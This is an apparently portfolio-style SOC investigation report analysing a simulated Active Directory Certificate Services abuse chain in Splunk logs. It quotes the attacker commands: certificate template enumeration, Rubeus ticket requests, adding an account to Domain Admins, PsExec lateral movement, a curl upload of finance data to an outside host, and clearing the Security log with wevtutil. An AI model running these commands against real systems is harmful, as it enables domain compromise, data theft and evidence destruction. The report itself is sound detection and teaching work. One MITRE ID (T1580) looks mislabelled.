# 🛡️ Investigation 31 — Active Directory Certificate Services (AD CS) Abuse

> **SOC Investigation Report** | Splunk-based Detection & Response Analysis

![Status](https://img.shields.io/badge/Status-Confirmed%20Attack-red)
![Severity](https://img.shields.io/badge/Severity-Critical-critical)
![Tool](https://img.shields.io/badge/SIEM-Splunk-black)
![MITRE](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-blue)

---

## 📋 Objective

Investigate suspicious **Active Directory Certificate Services (AD CS)** activity to identify certificate enumeration, vulnerable certificate templates, privilege escalation, lateral movement, certificate issuance, authentication abuse, data collection, exfiltration, and log clearing.

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| 🔢 Total Events | **120** |
| 🚨 Critical Events | **8** |
| ⚠️ High Severity Events | **4** |
| ✅ Low/Benign Events | **108** |
| 🎯 Compromised Account | `administrator` |
| 🖥️ Systems Involved | `DC01`, `FS01`, `CA01` |
| 🔓 Persistence Found | ❌ None observed |

The environment shows mostly normal user activity, with **12 high-value security events** revealing a **complete AD CS abuse attack chain** — from certificate enumeration through privilege escalation to data exfiltration and log clearing.

---

## 🔍 Event ID Distribution

| Event ID | Count | Description |
|---|---:|---|
| `4688` | 118 | 🧩 Process Creation |
| `1102` | 1 | 🧹 Audit Log Cleared |
| `4887` | 1 | 📜 Certificate Issued |

**Details:**
- **4688 (118 events):** Mostly benign processes (Chrome, Explorer, Teams, Excel, Svchost) alongside attacker tooling — `Certify.exe`, `Certreq.exe`, `Certutil.exe`, `Rubeus.exe`, `PsExec.exe`, `Robocopy.exe`, `Curl.exe`, `Wevtutil.exe`.
- **1102 (1 event):** 🚩 Windows Security Log cleared — a strong anti-forensic indicator.
- **4887 (1 event):** A certificate request completed successfully via AD CS.

---

## 📈 Severity Distribution

| Severity | Count |
|---|---:|
| 🔴 Critical | 8 |
| 🟠 High | 4 |
| 🟢 Low | 108 |

---

## 👥 User Activity

| User | Events | Notes |
|---|---:|---|
| alex.morgan | 27 | Routine activity |
| emma.smith | 27 | Routine activity |
| it.admin | 27 | Routine activity |
| john.doe | 27 | Routine activity |
| **administrator** | 10 | 🚨 **Compromised — full attack chain** |
| **SYSTEM** | 2 | 🧹 Log clearing |

### 🚨 Suspicious Account: `administrator`
Responsible for the entire attack chain:
- Certificate enumeration & template discovery
- Certificate request & privilege escalation
- Lateral movement, data collection, archiving, and exfiltration

### 🧹 `SYSTEM`
Performed security log clearing — likely automated cleanup following attacker actions.

---

## 🖥️ Hostname Distribution

| Host | Events | Role |
|---|---:|---|
| FIN01 | 27 | Workstation (normal) |
| HR01 | 27 | Workstation (normal) |
| WS101 | 27 | Workstation (normal) |
| WS102 | 27 | Workstation (normal) |
| **DC01** | 6 | 🏰 Domain Controller — enumeration, priv-esc, lateral movement |
| **FS01** | 5 | 📁 File Server — data theft, archiving, exfiltration, log clearing |
| **CA01** | 1 | 📜 Certificate Authority — certificate issuance |

---

## ⚙️ Processes Observed

| Process | Purpose | Assessment |
|---|---|---|
| `Certify.exe` | Certificate template enumeration | 🟠 Suspicious |
| `Certreq.exe` | Certificate request | 🟠 Suspicious |
| `Certsrv.exe` | Certificate issuance | 🟠 Suspicious |
| `Certutil.exe` | Certificate enumeration | 🟠 Suspicious |
| `Rubeus.exe` | Kerberos / certificate authentication abuse | 🔴 Highly Suspicious |
| `PowerShell.exe` | Privilege escalation | 🟠 Suspicious |
| `PsExec.exe` | Remote execution | 🟠 Suspicious |
| `Robocopy.exe` | Data collection | 🟠 Suspicious |
| `RAR.exe` | Archive creation | 🟠 Suspicious |
| `Curl.exe` | Data exfiltration | 🔴 Critical |
| `Wevtutil.exe` | Log clearing | 🔴 Critical |
| `Chrome.exe` / `Excel.exe` / `Explorer.exe` / `Teams.exe` / `Svchost.exe` | Normal activity | 🟢 Benign |

---

## 🎯 Critical Attack Events

### 1️⃣ AD CS Enumeration
```cmd
certutil -config - -ping
```
**Purpose:** Identify available Certificate Services infrastructure.
**Severity:** 🟠 High

### 2️⃣ Vulnerable Certificate Template Discovery
```cmd
Certify.exe find /vulnerable
```
**Purpose:** Enumerate templates vulnerable to ESC-style abuse.
**Severity:** 🔴 Critical

### 3️⃣ Certificate Request
```cmd
certreq -submit admin.inf
```
**Purpose:** Requested a certificate from AD CS.
**Severity:** 🔴 Critical

### 4️⃣ Certificate Issued
```text
certsrv.exe
```
**Purpose:** Certificate successfully issued by `CA01`.
**Severity:** 🔴 Critical

### 5️⃣ Certificate Authentication
```text
Rubeus asktgt /certificate
```
**Purpose:** Used the issued certificate to request a Kerberos TGT.
**Severity:** 🔴 Critical

### 6️⃣ Privilege Escalation
```powershell
Add-ADGroupMember "Domain Admins" backupsvc
```
**Purpose:** Added `backupsvc` to the Domain Admins group.
**Severity:** 🔴 Critical

### 7️⃣ Lateral Movement
```cmd
psexec \\FS01 cmd
```
**Purpose:** Remote execution against the file server.
**Severity:** 🟠 High

### 8️⃣ Data Collection
```cmd
robocopy D:\Finance C:\Temp
```
**Purpose:** Copied sensitive Finance data.
**Severity:** 🟠 High

### 9️⃣ Archive Creation
```cmd
rar a finance.rar
```
**Purpose:** Compressed collected data prior to exfiltration.
**Severity:** 🟠 High

### 🔟 Data Exfiltration
```cmd
curl -T finance.rar http://10.10.10.5/upload
```
**Purpose:** Transferred archived data to an external server.
**Severity:** 🔴 Critical

### 1️⃣1️⃣ Log Clearing
```cmd
wevtutil cl Security
```
**Purpose:** Deleted Windows Security logs to remove attacker traces.
**Severity:** 🔴 Critical

---

## 🕵️ Persistence Check

**No persistence mechanisms observed.** ✅

No evidence of:
- ❌ Scheduled Tasks
- ❌ Registry Run Keys
- ❌ Startup Folder entries
- ❌ Malicious Services

> The attacker prioritized privilege escalation, data theft, and anti-forensics over long-term access.

---

## ⏱️ Attack Timeline

```mermaid
timeline
    title AD CS Abuse — Attack Timeline
    09:00 : AD CS Enumeration (certutil)
    09:01 : Vulnerable Template Discovery (Certify.exe)
    09:02 : Certificate Request Submitted
    09:03 : Certificate Issued
    09:04 : Certificate Authentication (Rubeus)
    09:05 : Privilege Escalation (Domain Admins)
    09:06 : Lateral Movement to FS01
    09:07 : Finance Data Collection
    09:08 : Archive Created
    09:09 : Data Exfiltration
    09:10 : Security Log Cleared (wevtutil)
    09:11 : Audit Log Cleared
```

| Time | Activity |
|---|---|
| 09:00 | 🔎 AD CS Enumeration (`certutil`) |
| 09:01 | 📜 Vulnerable Certificate Template Discovery (`Certify.exe`) |
| 09:02 | 📝 Certificate Request Submitted |
| 09:03 | ✅ Certificate Issued |
| 09:04 | 🔑 Certificate Authentication (`Rubeus`) |
| 09:05 | ⬆️ Privilege Escalation (Domain Admins) |
| 09:06 | 🔀 Lateral Movement to FS01 |
| 09:07 | 📂 Finance Data Collection |
| 09:08 | 🗜️ Archive Created |
| 09:09 | 📤 Data Exfiltration |
| 09:10 | 🧹 Security Log Cleared (`wevtutil`) |
| 09:11 | 🧹 Audit Log Cleared |

---

## 🗺️ MITRE ATT&CK Mapping

| Technique | MITRE ID |
|---|---|
| Certificate Services Discovery | `T1580` |
| Steal or Forge Authentication Certificates | `T1649` |
| Valid Accounts / Privilege Escalation | `T1078` / `T1098` |
| Kerberos Ticket Abuse | `T1558` |
| Remote Service Execution (PsExec) | `T1021.002` |
| Data from Local System | `T1005` |
| Archive Collected Data | `T1560` |
| Exfiltration Over Web Service | `T1567.002` |
| Clear Windows Event Logs | `T1070.001` |

---

## ✅ Conclusion

This investigation demonstrates a **complete AD CS abuse attack chain**. The attacker:

1. 🔎 Enumerated the Certificate Authority
2. 📜 Identified vulnerable certificate templates
3. 📝 Requested and obtained a valid certificate
4. 🔑 Authenticated using that certificate
5. ⬆️ Escalated privileges to Domain Admin
6. 🔀 Moved laterally to the file server
7. 📂 Collected and exfiltrated sensitive finance data
8. 🧹 Cleared Windows Security logs to hide evidence

The `administrator` account should be treated as **compromised**. No persistence mechanisms were identified, suggesting the attacker's objective was **privilege escalation, data theft, and anti-forensics** rather than long-term footholds.

---

## 🧰 Tools & Skills Demonstrated

- Splunk log analysis & correlation
- Windows Event Log triage (4688, 1102, 4887)
- AD CS attack path recognition (ESC-style abuse)
- MITRE ATT&CK technique mapping
- Incident timeline reconstruction
- Anti-forensic activity detection

---

<p align="center">
  <i>📁 Part of my SOC Analyst Portfolio — Detection Lab Investigations Series</i>
</p>
